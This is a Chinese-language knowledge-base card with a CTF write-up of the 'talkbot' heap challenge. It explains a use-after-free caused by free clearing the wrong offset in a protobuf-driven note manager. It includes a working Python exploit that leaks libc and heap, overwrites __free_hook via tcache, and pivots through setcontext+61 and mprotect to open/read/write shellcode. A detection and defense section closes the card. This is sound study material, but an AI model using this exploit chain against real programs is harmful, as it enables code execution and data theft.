---
id: binary-pwn-heap-protobuf-free-zero-wrong-slot-uaf-freehook-mprotect-shellcode
title: protobuf 消息驱动的 note 管理器 free 后清零写到固定偏移（写 A060 而非真实 chunk A460）造成稳定 UAF：unsorted bin 泄 libc/heap → free_hook → magic gadget 转 rdx → setcontext+61 → mprotect 堆页 → ORW shellcode
type: scenario
domain: binary
path: binary/pwn/heap
technique: protobuf-free-zero-wrong-offset-uaf-freehook-setcontext-mprotect-orw
tags:
- pwn
- heap
- protobuf
- uaf
- free-hook
- setcontext
- mprotect
- orw
- seccomp
- glibc231
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:54:29+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；talkbot 的 free 置零写错偏移（A060 vs A460）、proto2 字段表（actionid/msgidx/msgsize/msgcontent）、8x0xf0+0xa0 的 unsorted bin 泄露 -0x1ecb61、tcache 泄露 heap -0x860、edit(6,p64(free_hook)) 两次 add 写 __free_hook、magic gadget libc+0x151990、setcontext+61、mprotect+ORW shellcode 均与正文 exp 一致；修正 fake context 偏移表述（原文 exp 用 ljust 相对写入序列，绝对偏移随 libc 版本漂移）与 unsorted bin 泄露步骤描述
url: /docs/binary/pwn/heap/binary-pwn-heap-protobuf-free-zero-wrong-slot-uaf-freehook-mprotect-shellcode/
draft: false
kb_aliases:
- talkbot
- 置零置错位置 UAF
- free 清零写错偏移
- protobuf 堆题 UAF
- setcontext+61 mprotect shellcode
- heap 不可执行 ORW
- 2023 ciscn talkbot
---

## 一句话结论

管理器用 protobuf 消息（`actionid/msgidx/msgsize/msgcontent`）驱动 add/edit/show/free，free 分支本意是把「idx 对应的指针槽」清零，但代码把清零目标写成了**固定的结构体偏移**（原文 `+0xA060`，真实槽位在 `+0xA460`）：于是 `free(idx)` 之后 `chunk_ptr[idx]` 仍然指向已释放的 chunk，UAF 稳定成立；配合 `show` 从 unsorted bin 残留里泄出 libc 与 heap，再 tcache 打 `__free_hook`，走「magic gadget 把 free 的 rdi 转成 setcontext 需要的 rdx → setcontext+61 → mprotect 把堆页改为可执行 → ORW shellcode」收尾，在读 flag 的 seccomp 沙箱下拿 flag。

## 原理

- **清零偏移写死是根因**：正常写法是 `*(&chunk_ptr + idx) = 0`（按 idx 索引）；本题写成了基址 + 常量偏移，所有 idx 都清到同一块内存。结果是「free 成功地释放了 chunk，但索引表里那条指针没被抹掉」，等价于一个**不需要竞态、不需要 double free 的稳定 UAF**。这类 bug 在索引表与结构体其它字段被编译到同一段 .bss 时极易出现（反编译里看着像 `*(a1 + 0xA060) = 0`）。
- **protobuf 只是外壳，字段成了攻击参数**：`msgidx` 决定操作哪一条、`msgsize` 决定 `malloc` 多大、`msgcontent` 是写入内容。逆出 `.proto` 后（`required sint64 actionid/msgidx/msgsize` + `required bytes msgcontent`，label=0 为 required、type=4 为 SINT64、type=15 为 BYTES，保留字段存在说明是 proto2），就能用 `pb2` 正常序列化任意操作——**协议反序列化本身不引入漏洞，但让「一次请求携带 size 与 idx 两个可控整数」变得非常方便**。
- **泄 libc 走 unsorted bin**：先申请 8 个 0xf0 块（另加一个 0xa0 块隔离 top），把前 7 个 free 掉时它们会先填满 0x100 的 tcache，于是第 8 个 `free(7)` 落进 unsorted bin、`show(7)` 读出来的内容里就含 `main_arena` 相关指针（原文 `-0x1ecb61`）；再 `show(6)` 读一个 tcache 块得堆地址（`-0x860`）。两条泄露在正文 exp 里都是固定偏移，说明该题 libc 版本固定（2.31）。
- **为什么收尾要 mprotect + shellcode 而不是 `system`**：程序装了 seccomp（只放行 open/read/write 一类），`execve` 与 `system` 都不可用；而且 **堆页本身不可执行**（原文明确「堆上是没有可执行权限的」）。所以必须先用 `mprotect` 把堆上某页改成 `PROT_READ|PROT_WRITE|PROT_EXEC`，再跳到紧随其后的 ORW shellcode。
- **为什么需要 magic gadget 做 rdi→rdx**：glibc 2.29 之后 `setcontext` 改为从 **rdx** 取 `ucontext_t`（`setcontext+61` 处开始恢复 r12–r15/rbp/rbx/rsi/rdi/rdx/rsp/r10），而 `free()` 调用 `__free_hook` 时可控的是 **rdi**（被 free 的指针）。所以把 `__free_hook` 直接指向 `setcontext+61` 不成立，必须先经一个 `mov rdx, qword ptr [rdi+8]; mov qword ptr [rsp], rax; call qword ptr [rdx+0x20]` 形态的 gadget（原文 `libc+0x151990`）把 `[chunk+8]` 转到 rdx 并调用 `[rdx+0x20]`。
- **fake context 的布局**：`[rdx+0x20]` 放 `setcontext+61`；其后依次是 `+0x58`→rdi（`mprotect` 的地址，原文 `heap-0x1e0` 页对齐后）、`+0x60`→rsi（`0x2000`）、`+0x78`→rdx（`7`）、`+0x90`→rsp（`rop_addr`，即 shellcode 地址）、`+0x98`→`push` 后 `ret` 的目标（`mprotect` 地址）。setcontext 先把 rsp 切到 `rop_addr`、再把该槽压栈并 `ret` 进入 `mprotect`，`mprotect` 返回后从 `rop_addr` 继续执行 shellcode——**用 mprotect 的返回路径完成「跳到堆上 shellcode」**，不需要 `jmp rsp` gadget。注意这些偏移取自原文 exp 的 `ljust(...)` 写入序列，是「相对写入起点」的值，与 `setcontext+61` 按 libc 偏移恢复寄存器的绝对位置差一个固定位移（不同 libc 版本还需按目标重新确认）。
- **为什么改 `__free_hook` 要两次 add**：`edit(6, p64(free_hook))` 改写的是 tcache 块里残留的 `fd`，随后两次 `add` 依次返回该块与 `free_hook`，第二次 `add(10, ..., p64(magic_gadget))` 就把 `__free_hook` 写成 gadget——这是「UAF 拿 fd 写 + tcache 分配到任意地址」的标准两步。

## 触发条件

- 管理器把 chunk 指针存在与其它字段共处一段的结构体/数组里，且 free 分支的清零目标是写死的常量偏移（反编译特征：`*(a1 + <常量>) = 0`，不随 idx 变化）。
- `show` 存在且能读出 chunk 内容（用于泄 libc/heap），或另有泄露通道。
- glibc 版本仍在 2.34 之前（保留 `__free_hook`）；本题为 2.31。
- 程序 seccomp 禁 `execve`，且堆不可执行，因此需要 `mprotect` + ORW。
- 能通过 protobuf（或任意）接口精确控制 `malloc` 大小与写入内容，且能 free 足够多次以布置 unsorted bin 与 tcache。

## 利用步骤

1. **逆出协议**：按 `0x28AAEEF9` 魔数定位 `ProtobufCMessageDescriptor`，读 `fields` 指向的 `ProtobufCFieldDescriptor` 表，得到字段名/编号/label/type/offset，写出 `proto2` 定义并用 `protoc --python_out` 生成 `pb2`；`actionid` 即功能号（1=add、2=edit、3=show、4=free）。
2. **触发 UAF**：`add` 一批 0xf0 块，`free` 掉 7 个后 `free` 第 8 个（进入 unsorted bin 触发合并），此时被 free 的槽位指针仍然有效。
3. **泄 libc**：`show(7)`，从回显里取 unsorted bin 残留指针减固定偏移得 libc base；`show(6)` 取堆地址减偏移得 heap base。
4. **打 `__free_hook`**：`edit(<victim>, p64(free_hook))` 把残留 `fd` 改成 `__free_hook`，`add` 两次分别拿到 victim 与 `free_hook`，第二次写入 `magic_gadget`。
5. **布置 fake context**：把 `[victim+8]` 指向 fake context 基址，在 `+0x20` 放 `setcontext+61`，`+0x58/+0x60/+0x78` 放 `mprotect` 的 `addr/len/prot`，`+0x90/+0x98` 放 shellcode 地址与 `mprotect` 地址。
6. **写 ORW shellcode**：在堆上可执行目标地址写 `push 0x67616c66; mov rdi,rsp; xor esi,esi; push 2; pop rax; syscall; ...`（open/read/write）。
7. **触发**：`free(victim)` → `__free_hook`=magic gadget → rdx=fake context → `setcontext+61` → `mprotect(堆页,0x2000,7)` → 返回跳到 shellcode → 输出 flag。

## PoC

协议定义（原文由 descriptor 逆出）：

```protobuf
syntax = "proto2";
message devicemsg {
  required sint64 actionid  = 1;   /* 1=add 2=edit 3=show 4=free */
  required sint64 msgidx    = 2;
  required sint64 msgsize   = 3;
  required bytes  msgcontent= 4;   /* BYTES: 实际内容 */
}
```

泄露与打 hook（偏移为原题环境，需按目标 libc 重算）：

```python
for i in range(8): add(i, 0xf0, b'a')
add(8, 0xa0, b'b')
for i in range(7): free(i)
free(7)                       # 进入 unsorted bin，槽位指针未清 -> UAF

show(7); mx.recv(0x50)
libc_addr = h64() - 0x1ecb61
libc.address = libc_addr
show(6)
heap_addr = h64() - 0x860

setcontext_61 = libc.sym['setcontext'] + 61
magic_gadget  = libc_addr + 0x151990   # mov rdx,[rdi+8]; mov [rsp],rax; call [rdx+0x20]
free_hook     = libc.sym['__free_hook']

edit(6, p64(free_hook))       # UAF 写 fd -> 目标地址
add(9,  0xf0, b'a')
add(10, 0xf0, p64(magic_gadget))   # __free_hook = magic gadget
```

fake context + mprotect + shellcode：

```python
rop_addr = heap_addr + 0x9d0
p1  = p64(heap_addr + 0x420) + p64(heap_addr + 0x420 - 0x20)
p1  = p1.ljust(0x10, b'\x00') + p64(setcontext_61)
p1  = p1.ljust(0x58, b'\x00') + p64(heap_addr - 0x1e0)   # +0x58 -> rdi = 页对齐堆地址
p1  = p1.ljust(0x60, b'\x00') + p64(0x2000)              # +0x60 -> rsi = len
p1  = p1.ljust(0x78, b'\x00') + p64(7)                   # +0x78 -> rdx = PROT_RWX
p1  = p1.ljust(0x90, b'\x00') + p64(rop_addr)            # +0x90 -> rsp = shellcode
p1  = p1.ljust(0x98, b'\x00') + p64(libc.sym['mprotect']) # +0x98 -> r10 = mprotect
edit(4, p1)

shellcode = asm('''
    push 0x67616c66          /* "flag" */
    mov rdi, rsp
    xor esi, esi
    push 2
    pop rax
    syscall                  /* open("flag",0) */
    mov rdi, rax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall                  /* read(fd, rsp, 0x100) */
    mov edi, 1
    mov rsi, rsp
    push 1
    pop rax
    syscall                  /* write(1, rsp, ...) */
''')
edit(6, shellcode)
free(2)                      /* 触发 __free_hook */
```

## 变体与关联

- **变体（改成 `__free_hook` → `setcontext` → `read` 自覆写）**：若堆可执行或有 `jmp rsp`，可省掉 `mprotect`，直接用第二阶段 `read` 把 ROP 写到已知地址（见关联卡）。
- **变体（清零正确但少清一格）**：同类 bug 的另一形态是「压缩数组后末槽不清零」，同样得到稳定 UAF，只是位置在数组末端。
- **变体（无 `show`）**：改用 unsorted bin + `_IO_2_1_stdout_` 的部分覆写泄 libc；或先打 heap 地址再从 tcache 计数推 libc。
- **关联**：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（同为 `__free_hook` + 桥接 gadget + `setcontext+61`，但那条没有 mprotect，用 `read` 自覆写堆栈完成 ORW；本卡的增量是「堆不可执行 → mprotect + ORW shellcode」与 protobuf 驱动的 UAF 入口）、[[binary-pwn-heap-protobuf-c-free-overlap-fsop-orw]]（同为 protobuf-c 堆题，那条用 content 长度控块伪造大 chunk 走 FSOP）、[[code-analysis-reverse-linux-protobuf-c-descriptor-recovery]]（descriptor 逆出流程）、[[binary-pwn-heap-offbyone-show-codebase-stdout-leak-freehook-mprotect-orw]]（同样以 `mprotect` + ORW shellcode 收尾，那条入口是 off-by-one 与 stdout 泄露）。
- **边界**：glibc 2.34+ 移除 `__free_hook` 后本链需换 `exit_funcs`/FSOP；`setcontext` 的寄存器恢复偏移随版本漂移，必须按目标 libc 重新确认；seccomp 若同时禁 `mprotect`，则需改用 `read` 自覆写或 SROP。

## 检测与防御

- **代码层**：索引表的清零必须按 idx 索引（`table[idx] = NULL`），禁止写死偏移；`free` 后立刻置空并校验；`show` 前校验长度不超申请大小。
- **加固**：glibc 升级到移除 hook 的版本；堆加 `PROT_NONE` 执行保护（本类题堆本就不可执行，但 `mprotect` 可绕过）；seccomp 同时禁 `mprotect`/`pkey_mprotect`；开启 `FORTIFY`、`safe-linking`、CET/shadow stack。
- **检测**：进程出现把堆页改为 `PROT_EXEC` 的 `mprotect`（强特征）；`__free_hook` 被写成 libc 内非预期地址；`free()` 之后立刻 `syscall` 序列 `open/read/write`；protobuf 请求里 `msgsize` 与 `msgcontent` 长度不一致或 `msgidx` 越界。
- **取证**：dump 堆上 fake context（`setcontext+61`、`mprotect`、shellcode 特征串 `0x67616c66`）与 tcache 链，可完整还原链路；`msgidx` 序列能还原攻击者操作顺序。
